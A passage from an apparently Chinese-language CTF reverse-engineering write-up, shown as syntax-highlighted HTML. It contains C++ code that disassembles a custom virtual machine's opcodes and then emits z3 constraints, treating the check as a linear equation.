punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"in_pointer = 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rst_out</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"out_pointer = 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pop_in</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>b<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory[%x] = input[%x]\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"in_pointer++\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pop_out</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>b<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"output[%x] = Memory[%x]\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"in_pointer++\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">read_buf</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input: %d"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">write_buf</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"output: output[]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">jmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b&amp;&amp;)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if(%d) &amp;&amp; !Memory[%x] jmp %d\n"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>ep<span class="token operator">/</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"else jmp %d"</span><span class="token punctuation">,</span>ep<span class="token operator">/</span><span class="token number">4</span> <span class="token operator">+</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">njmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b&amp;&amp;)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if(%d) &amp;&amp; !Memory[%x] jmp %d\n"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>ep<span class="token operator">/</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"else jmp %d"</span><span class="token punctuation">,</span>ep<span class="token operator">/</span><span class="token number">4</span> <span class="token operator">+</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">len</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b&amp;&amp;)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory[%x] = strlen(input)"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3<span class="token punctuation">,</span>v4<span class="token punctuation">,</span>v5<span class="token punctuation">,</span>v6<span class="token punctuation">,</span>v7<span class="token punctuation">,</span>v8<span class="token punctuation">,</span>v9<span class="token punctuation">,</span>v10<span class="token punctuation">,</span>v11<span class="token punctuation">,</span>v12<span class="token punctuation">,</span>v13<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>    <span class="token keyword">int</span> in_pointer<span class="token punctuation">;</span>    <span class="token keyword">int</span> ep<span class="token punctuation">,</span>op<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ep<span class="token operator">=</span>opcode<span class="token punctuation">[</span>op<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ep<span class="token operator">==</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%04d: "</span><span class="token punctuation">,</span>op<span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span> ep <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        v1 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        v2 <span class="token operator">=</span> <span class="token function">sub</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        v3 <span class="token operator">=</span> <span class="token function">mul</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        v4 <span class="token operator">=</span> <span class="token function">divide</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        v5 <span class="token operator">=</span> <span class="token function">rst_in</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>        v6 <span class="token operator">=</span> <span class="token function">rst_out</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>        v7 <span class="token operator">=</span> <span class="token function">pop_in</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>        v8 <span class="token operator">=</span> <span class="token function">pop_out</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>        buf <span class="token operator">=</span> <span class="token function">read_buf</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xA</span><span class="token operator">:</span>        v10 <span class="token operator">=</span> <span class="token function">write_buf</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xB</span><span class="token operator">:</span>        v11 <span class="token operator">=</span> <span class="token function">jmp</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xC</span><span class="token operator">:</span>        v12 <span class="token operator">=</span> <span class="token function">njmp</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xD</span><span class="token operator">:</span>        v13 <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>          op <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>         <span class="token comment">//exit(1);</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析可得，这是一个线性方程</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span><span class="token expression"><span class="token punctuation">;</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> opcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> memory<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//printf("Memory[%x] = v%d + %d",a*4,b*4,memory[c*4]);</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    d<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>memory<span class="token punctuation">[</span>c<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" == %d )\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">mul</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">600</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s.add("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(v%d * %d) "</span><span class="token punctuation">,</span>b<span class="token operator">-</span><span class="token number">600</span><span class="token punctuation">,</span>memory<span class="token punctuation">[</span>c<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">600</span><span class="token operator">&lt;</span><span class="token number">19</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b-600==19)printf("\n");</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">divide</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 